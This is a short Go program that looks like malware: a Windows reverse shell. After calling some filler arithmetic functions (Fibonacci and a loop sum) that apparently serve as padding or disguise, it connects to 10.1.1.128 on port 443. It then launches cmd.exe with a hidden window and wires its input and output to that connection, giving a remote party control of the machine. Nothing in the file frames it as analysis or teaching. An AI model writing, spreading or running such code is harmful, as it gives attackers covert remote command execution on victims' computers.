
package main

import (
    "fmt"
    "net"
    "os"
    "os/exec"
    "syscall"
)

func fibonacci(number int) int {
    if number == 1 || number == 2 {
        return 1
    }
    return fibonacci(number-1) + fibonacci(number-2)
}

func suma_for(number int) int {
    sum := 0
    for i := 0; i <= number; i++ {
        sum = (i % 2)
    }
    return sum
}

func todo_en_uno() {
    suma_for(5)
    f := fibonacci(5)
    f += f
}

const (
    ip = "10.1.1.128"
    puerto = "443"
    prot = "tcp"
)

func main() {
    todo_en_uno() // CallEveryone Function
    connection, err := net.Dial(prot, ip+":"+puerto)

    if err != nil {
        fmt.Printf("An Error Has Ocurred: %s", err.Error())
        os.Exit(1)
    }

    _, err = connection.Write([]byte("Hello Server! "))
    buffer := make([]byte, 1024)
    mLen, err := connection.Read(buffer)

    cmd := exec.Command("cmd.exe")
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

    cmd.Stdin = connection
    cmd.Stdout = connection
    cmd.Stderr = connection

    cmd.Run()
    if err != nil {
        fmt.Printf("Error reading: %s", err.Error())
        os.Exit(1)
    }

    fmt.Println("Received: ", string(buffer[:mLen]))
    // defer connection.Close()
}
